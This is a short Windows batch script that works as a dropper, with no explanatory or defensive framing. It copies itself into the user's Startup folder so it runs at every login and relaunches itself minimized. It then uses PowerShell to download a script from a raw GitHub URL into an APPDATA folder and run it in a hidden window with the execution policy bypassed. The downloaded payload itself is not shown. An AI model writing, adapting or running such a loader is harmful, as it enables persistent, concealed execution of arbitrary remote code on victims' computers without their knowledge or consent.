@echo off
setlocal
@echo off
set "scriptPath=%~dpnx0"
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set PS_SCRIPT_PATH=%APPDATA%\trolo2\trolo2.ps1
copy "%scriptPath%" "%startupFolder%" >nul
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
powershell -Command "New-Item -ItemType Directory -Force -Path $env:APPDATA\trolo2; Invoke-WebRequest 'https://raw.githubusercontent.com/realirist/trolo.ps1/refs/heads/main/trolo2.ps1' -OutFile $env:APPDATA\trolo2\trolo2.ps1" 2>nul
if exist "%PS_SCRIPT_PATH%" powershell -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'powershell.exe' -ArgumentList '-ExecutionPolicy Bypass -File ""%PS_SCRIPT_PATH%""' -WindowStyle Hidden"

exit
